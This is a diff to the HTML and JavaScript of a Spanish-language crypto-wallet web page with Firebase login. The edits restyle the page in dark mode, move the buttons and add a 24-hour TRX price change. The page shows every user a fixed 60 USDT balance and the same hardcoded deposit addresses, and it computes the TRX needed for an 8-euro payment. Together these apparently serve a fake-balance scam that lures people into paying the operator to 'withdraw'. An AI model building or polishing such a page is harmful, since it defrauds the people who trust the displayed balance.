@@ -7,34 +7,37 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
+      background-color: #121212; /* Fondo negro oscuro */
       margin: 0;
       padding: 0;
+      color: #ffffff; /* Texto blanco */
     }
     .container {
       max-width: 600px;
       margin: 40px auto;
-      background-color: white;
+      background-color: #1e1e1e; /* Contenedor más claro */
       padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
     }
     h1, h2 {
       text-align: center;
-      color: #007bff;
+      color: #00bfff;
     }
     input {
       width: calc(100% - 22px);
       padding: 10px;
       margin-bottom: 15px;
       border-radius: 5px;
-      border: 1px solid #ccc;
+      border: 1px solid #333;
+      background-color: #2b2b2b;
+      color: #fff;
     }
     button {
-      width: 100%;
+      width: 48%;
       padding: 12px;
-      margin-bottom: 10px;
-      background-color: #007bff;
+      margin: 10px 1%;
+      background-color: #292929; /* Botón más claro */
       border: none;
       border-radius: 6px;
       color: white;
@@ -42,18 +45,27 @@
       cursor: pointer;
     }
     button:hover {
-      background-color: #0056b3;
+      background-color: #444;
     }
     .section {
       display: none;
       margin-top: 20px;
     }
     .result {
-      background: #f1f1f1;
+      background: #1c1c1c;
       padding: 10px;
       border-radius: 5px;
       margin-bottom: 15px;
-      word-break: break-all;
+      word-break: break-word;
+    }
+    .stats-green {
+      color: #00ff00;
+      margin-top: 10px;
+    }
+    .button-row {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
     }
   </style>
 </head>
@@ -72,8 +84,13 @@
       <h2>Bienvenido</h2>
       <p><strong>Saldo:</strong> 60 USDT (TRX)</p>
       <div id="priceInfo" class="result">Cargando precio...</div>
+      <div class="stats-green" id="change24h">Cargando cambio 24h...</div>
 
-      <button id="receiveBtn">📥 Recibir</button>
+      <div class="button-row">
+        <button id="receiveBtn">📥 Recibir</button>
+        <button id="sendBtn">📤 Enviar</button>
+      </div>
+
       <div id="receiveData" class="result" style="display:none;">
         <strong>USDT TRX:</strong><br/>
         <span onclick="copyToClipboard('TMacSeNh7ZzuMTXgNccQbBD3wewyYSYSjn')">TMacSeNh7ZzuMTXgNccQbBD3wewyYSYSjn</span><br/><br/>
@@ -81,7 +98,6 @@
         <span onclick="copyToClipboard('65yX9MGe62PXhNrgPFo7u3RqpyZjmDmF3r8k1HGAGfM4')">65yX9MGe62PXhNrgPFo7u3RqpyZjmDmF3r8k1HGAGfM4</span>
       </div>
 
-      <button id="sendBtn">📤 Enviar</button>
       <div id="sendData" class="result" style="display:none;">
         <p>Tienes 60 USDT en TRX.</p>
         <p>Valor en tiempo real: <span id="usdValue">Cargando...</span></p>
@@ -110,27 +126,22 @@
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
 
-    // Referencias
     const authSection = document.getElementById("authSection");
     const walletSection = document.getElementById("walletSection");
     const emailInput = document.getElementById("email");
     const passwordInput = document.getElementById("password");
 
     document.getElementById("registerBtn").onclick = async () => {
-      const email = emailInput.value;
-      const pass = passwordInput.value;
       try {
-        await createUserWithEmailAndPassword(auth, email, pass);
+        await createUserWithEmailAndPassword(auth, emailInput.value, passwordInput.value);
       } catch (e) {
         alert("Error: " + e.message);
       }
     };
 
     document.getElementById("loginBtn").onclick = async () => {
-      const email = emailInput.value;
-      const pass = passwordInput.value;
       try {
-        await signInWithEmailAndPassword(auth, email, pass);
+        await signInWithEmailAndPassword(auth, emailInput.value, passwordInput.value);
       } catch (e) {
         alert("Error: " + e.message);
       }
@@ -149,35 +160,35 @@
       }
     });
 
-    // Recibir botón
     document.getElementById("receiveBtn").onclick = () => {
       const el = document.getElementById("receiveData");
       el.style.display = el.style.display === "none" ? "block" : "none";
     };
 
-    // Enviar botón
     document.getElementById("sendBtn").onclick = () => {
       const el = document.getElementById("sendData");
       el.style.display = el.style.display === "none" ? "block" : "none";
     };
 
-    // Precio TRX
     async function fetchPrice() {
       try {
-        const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=eur");
+        const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=eur&include_24hr_change=true");
         const data = await res.json();
         const price = data.tron.eur;
+        const change = data.tron.eur_24h_change;
         const value = 60;
         const needed = 8 / price;
+
         document.getElementById("priceInfo").textContent = `1 TRX ≈ ${price.toFixed(4)} €`;
         document.getElementById("usdValue").textContent = `≈ ${value} USDT = ${(value / price).toFixed(2)} TRX`;
         document.getElementById("trxNeeded").textContent = needed.toFixed(2);
+        document.getElementById("change24h").textContent = `Cambio 24h: ${change.toFixed(2)}% / ${(price * change / 100).toFixed(4)} €`;
       } catch (e) {
         document.getElementById("priceInfo").textContent = "Error al obtener precio TRX";
+        document.getElementById("change24h").textContent = "";
       }
     }
 
-    // Copiar al portapapeles
     window.copyToClipboard = (text) => {
       navigator.clipboard.writeText(text);
       alert("Copiado: " + text);
